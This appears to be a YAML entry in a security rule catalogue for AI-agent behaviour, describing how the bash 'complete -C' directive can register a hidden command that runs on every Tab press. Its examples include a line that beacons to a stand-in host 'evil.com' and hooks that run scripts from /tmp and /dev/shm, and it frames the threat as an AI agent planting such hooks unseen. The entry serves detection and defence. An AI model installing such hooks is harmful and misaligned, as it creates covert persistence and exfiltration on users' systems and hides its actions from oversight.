id: "persistence-evasion/shell-hooks/completion-code-exec"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Shell Hooks and Keyboard Binding Abuse"
category_id: "6.15"
name: "Shell Completion Command Execution Hook"
risk_level: "high"

abstract: |
  An AI agent uses `complete -C` to register an external command that
  executes on every Tab keypress for a target command — creating a
  high-frequency stealth execution channel invisible to the user that
  can beacon, exfiltrate, or execute payloads triggered by normal typing.

explanation: |
  `complete -C command target` runs `command` every time the user presses
  Tab to autocomplete `target`. Unlike `-F` (which calls a shell function),
  `-C` executes an arbitrary external command or script:

    complete -C '/tmp/evil.sh' git
    → Every Tab press while typing "git ..." runs /tmp/evil.sh

    complete -C 'curl -s evil.com/beacon' ssh
    → Tab completion on "ssh ..." silently beacons to attacker

  This is particularly insidious because:
  - Tab completion fires on one of the most frequently pressed keys
  - The user sees normal completion suggestions (evil.sh outputs them)
  - Execution is invisible — no visual indication is shown
  - Persists for the full shell session
  - -C runs an EXTERNAL command vs -F which calls an existing function

  Legitimate use: some tools (AWS CLI, Terraform) use complete -C for
  their own completion, but this should be whitelisted explicitly.

recommendation: |
  - Block `complete -C` in AI agent execution environments.
  - Audit shell startup files for unexpected complete directives.
  - Whitelist known-good completion registrations (aws_completer).
  - Monitor for complete invocations with suspicious command arguments.

examples:
  bad:
    - "complete -C '/tmp/evil.sh' git"
    - "complete -C 'curl -s evil.com/beacon' ssh"
    - "complete -C /dev/shm/.c2.sh kubectl"
  good:
    - "complete -C aws_completer aws"
    - "complete -F _git git"

